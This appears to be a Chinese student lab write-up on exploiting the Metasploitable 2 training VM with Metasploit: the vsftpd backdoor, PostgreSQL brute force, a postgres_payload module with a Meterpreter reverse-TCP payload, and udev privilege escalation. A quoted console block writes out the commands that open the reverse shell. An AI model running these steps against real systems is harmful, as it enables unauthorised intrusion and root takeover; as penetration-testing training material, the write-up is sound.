---
title: Metasploitable2 漏洞评估
date: 2024-04-17 21:05:24
lang: zh
summary: metasploitable2-漏洞评估
---
## 一、任务

目标：利用Metasploit Framework，选择并利用一个Metasploitable 2中的漏洞。

参考链接：

[Pentest lab - Metasploitable 2 - Core dump overflow (chousensha.github.io)](https://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/)

[Metasploitable 2 Exploitability Guide | Metasploit Documentation (rapid7.com)](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)

[《Kali Linux 2 网络渗透测试 实践指南 第2版》之主动扫描（Nmap） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/386943615)

## 二、准备工作

### 下载Metasploitable 2虚拟机

下载成功后，通过ifconfig来查看IP地址：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205422.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205422.png)

然后再kali虚拟机中通过Nmap对该目标进行扫描：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205535.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205535.png)

由上可知两者能联系通信，表示安装成功。

## 三、漏洞利用

### 1、尝试利用Port 21 vsftpd：

Metasploit 中有一个可用于 vsftpd 版本的漏洞：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417172847.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417172847.png)

利用该漏洞获取一个shell：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417172615.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417172615.png)

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205701.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205701.png)

设置成功以后，就可以攻击了。

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205757.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205757.png)

由上图所示，攻击成功。

### 2、Port 5432 postgresql：

#### ①暴力破解

首先尝试暴力辅助模块，可以看到 mysql 数据库没有密码保护，看是否能进入这个模块。

此模块尝试使用 USER_FILE、PASS_FILE 和 USERPASS_FILE选项。

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417194134.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417194134.png)

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205914.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417205914.png)

攻击登陆成功，接下来利用另一个漏洞攻击。

#### ②PostgreSQL for Linux 有效负载执行

在某些默认的 Linux 安装的 PostgreSQL 上，postgres 服务帐户可能会写入 /tmp 目录，并可能源 UDF 共享库的 om 也在那里，允许执行任意代码。该模块编译一个 Linux 共享对象文件，通过 UPDATE 将其上传到目标主机 pg_largeobject二进制注入方法，并从该共享对象创建 UDF（用户定义函数）。因为有效负载是作为共享的 对象的构造函数，它不需要符合特定的 Postgres API 版本。

[渗透测试实验室]  https://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/

```text
msf > use exploit/linux/postgres/postgres_payload
msf exploit(postgres_payload) > show options

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
   RHOST                      yes       The target address
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output

Exploit target:

   Id  Name
   --  ----
   0   Linux x86

msf exploit(postgres_payload) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(postgres_payload) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
set PASSWORD postgres
PASSWORD => postgres
msf exploit(postgres_payload) > exploit

[*] Started reverse handler on 192.168.127.159:4444
[*] 192.168.127.154:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] Uploaded as /tmp/uVhDfWDg.so, should be cleaned up automatically
[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
[*] Sending stage (1228800 bytes) to 192.168.127.154
[*] Meterpreter session 1 opened (192.168.127.159:4444 -> 192.168.127.154:37141) at 2014-06-06 22:49:17 +0300
```

按照如上教程进行操作并不能得到预期结果：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417210144.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417210144.png)

报错显示：Msf::OptionValidateError The following options failed to validate: RHOSTS

表明在 Metasploit 中的某个模块使用了 RHOSTS 选项，并且该选项未能通过验证。

然后我就寻思LHOST是攻击机的ip地址，而RHOSTS是受害机的ip地址，那好办了，我们进行设置：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417210249.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417210249.png)

设置好LHOST和RHOSTS的ip地址后，如愿攻击成功。

从这之后开始，我们必须再次提升我们的特权。利用 udev 漏洞利用相同的漏洞，但这次是从 Metasploit 内部：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417203010.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417203010.png)

如上显示：No payload configured...

遇到了一个没有配置有效载荷（payload）的问题，需要手动配置有效载荷，以确保漏洞利用时 Meterpreter 会话能够返回到攻击机上，则我们set payload即可：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417210423.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417210423.png)

如上图成功地创建了两个 Meterpreter 会话（session 2 和 session 3），但并没有立即看到 shell 提示符。

我们尝试再Meterpreter会话中执行shell命令来获取shell提示符，这个命令会尝试在目标系统上启动一个交互式 shell：

[![](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417203031.png)](https://haotlas.cn/wp-content/uploads/2024/04/QQ图片20240417203031.png)

获取shell成功！

## 四、问题

1、描述你所选择的漏洞将对目标计算机造成什么可能的损害？

- 在未授权的情况下访问数据库：可能导致数据泄露，破坏或者篡改数据库信息，导致系统损毁等。

- 以root权限远程执行任意代码： 攻击者能在目标系统上执行任意代码。这意味着攻击者可以在系统上执行恶意操作，例如安装后门、植入恶意软件、删除或篡改文件，甚至完全控制受影响的系统。

2、分析你所选择的漏洞具体是怎么产生的。

- 管理员在设置数据库密码时并未设置强密码，于是攻击者通过暴力破解可能破解登录数据库。

- 利用默认情况下 PostgreSQL 服务账户在某些 Linux 安装中对 /tmp 目录的写入权限。攻击者在目标系统上上传了恶意的共享对象文件，然后通过数据库的 pg_largeobject 功能将其注入到系统中。攻击者再创建一个用户定义函数（UDF），从而使得在数据库上执行的任意代码可以触发系统上的恶意代码执行。

- 利用Linux 系统中 udev 的漏洞。攻击者利用已经提升了的权限，在目标系统上执行恶意代码，从而获取了 root 权限。